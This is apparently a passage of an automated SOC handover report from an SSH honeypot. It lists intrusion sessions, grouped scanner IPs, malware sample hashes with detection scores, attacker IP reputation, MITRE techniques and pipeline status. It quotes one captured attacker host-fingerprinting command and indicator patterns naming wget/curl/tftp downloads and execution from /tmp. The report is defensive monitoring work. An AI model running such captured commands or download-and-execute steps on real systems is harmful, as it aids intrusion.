| `2026-07-24 18:53:41` | `cowrie.login.success` |
| `2026-07-24 18:53:43` | `cowrie.session.params` |
| `2026-07-24 18:53:43` | `cowrie.command.input` |
| `2026-07-24 18:53:43` | `cowrie.command.input` |
| `2026-07-24 18:53:43` | `cowrie.command.input` |
| `2026-07-24 18:53:43` | `cowrie.command.input` |
| `2026-07-24 18:53:43` | `cowrie.command.input` |
| `2026-07-24 18:53:43` | `cowrie.command.success` |
| `2026-07-24 18:53:43` | `cowrie.command.input` |
| `2026-07-24 18:53:43` | `cowrie.command.input` |
| `2026-07-24 18:53:43` | `cowrie.command.input` |
| `2026-07-24 18:53:43` | `cowrie.command.input` |
| `2026-07-24 18:53:43` | `cowrie.log.closed` |
| `2026-07-24 18:53:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-217c367a7e51

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:54 |
| **Last Seen** | 2026-07-24 18:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:54:44` | `cowrie.session.connect` |
| `2026-07-24 18:54:45` | `cowrie.client.version` |
| `2026-07-24 18:54:45` | `cowrie.client.kex` |
| `2026-07-24 18:54:46` | `cowrie.login.success` |
| `2026-07-24 18:54:48` | `cowrie.session.params` |
| `2026-07-24 18:54:48` | `cowrie.command.input` |
| `2026-07-24 18:54:48` | `cowrie.command.input` |
| `2026-07-24 18:54:48` | `cowrie.command.input` |
| `2026-07-24 18:54:48` | `cowrie.command.input` |
| `2026-07-24 18:54:48` | `cowrie.command.input` |
| `2026-07-24 18:54:48` | `cowrie.command.success` |
| `2026-07-24 18:54:48` | `cowrie.command.input` |
| `2026-07-24 18:54:48` | `cowrie.command.input` |
| `2026-07-24 18:54:48` | `cowrie.command.input` |
| `2026-07-24 18:54:48` | `cowrie.command.input` |
| `2026-07-24 18:54:48` | `cowrie.log.closed` |
| `2026-07-24 18:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **5** | 2026-07-24 17:13 | 2026-07-24 18:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.84.108[.]75` | **3** | 2026-07-24 17:15 | 2026-07-24 17:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]56` | **3** | 2026-07-24 18:54 | 2026-07-24 18:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | **3** | 2026-07-24 17:50 | 2026-07-24 17:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]92` | **3** | 2026-07-24 17:17 | 2026-07-24 17:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `124.174.14[.]174` | **2** | 2026-07-24 17:02 | 2026-07-24 17:04 | 2m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | **2** | 2026-07-24 18:05 | 2026-07-24 18:20 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-07-24 18:47 | 2026-07-24 18:47 | 10s | 0 | `T1592` | 🟢 LOW |
| `115.190.128[.]221` | 1 | 2026-07-24 18:44 | 2026-07-24 18:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.191.27[.]238` | 1 | 2026-07-24 17:45 | 2026-07-24 17:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.239.129[.]2` | 1 | 2026-07-24 17:16 | 2026-07-24 17:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.122[.]90` | 1 | 2026-07-24 18:00 | 2026-07-24 18:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `175.170.144[.]19` | 1 | 2026-07-24 18:02 | 2026-07-24 18:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `178.178.194[.]137` | 1 | 2026-07-24 17:16 | 2026-07-24 17:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.184.183[.]66` | 1 | 2026-07-24 17:43 | 2026-07-24 17:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]21` | 1 | 2026-07-24 17:02 | 2026-07-24 17:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `95.79.57[.]221` | 1 | 2026-07-24 17:17 | 2026-07-24 17:19 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5348b12f049d86c5306ad9ea227b8483155183cb2a535c25b5c587c4c2491923` | ELF Binary (Linux executable) (x86-64 64-bit) | `5348b12f049d86c5...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `220.178.246[.]43` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `61.37.150[.]6` | KR | LG Uplus | **100** ⚠️ | 50 |
| `36.64.36[.]101` | ID | PT TELKOM INDONESIA Menara Multimedia Lt.7 Jl. Kebon sirih No.12 JAKARTA | **100** ⚠️ | 50 |
| `65.20.149[.]239` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `200.106.49[.]149` | PE | INTEGRATEL PERÚ S.A.A. | **100** ⚠️ | 50 |
| `60.18.139[.]82` | CN | China Unicom Liaoning province network | **100** ⚠️ | 50 |
| `218.13.214[.]18` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `49.124.151[.]21` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 47 |
| `81.214.75[.]248` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 50 |
| `182.53.52[.]68` | TH | TOT Public Company Limited | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 190 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 181 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 118 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 118 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 118 |

---

## 🔕 False Positive Summary (23 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 7 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 232 cases |
| Tool 34  | Credential Extractor        | ✅ 204 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 79 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 23 filtered (9.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 54 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 178 priority case(s) shown individually · 17 recon entry/entries in table (7 group(s) consolidating 21 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-24T19:35:48Z_
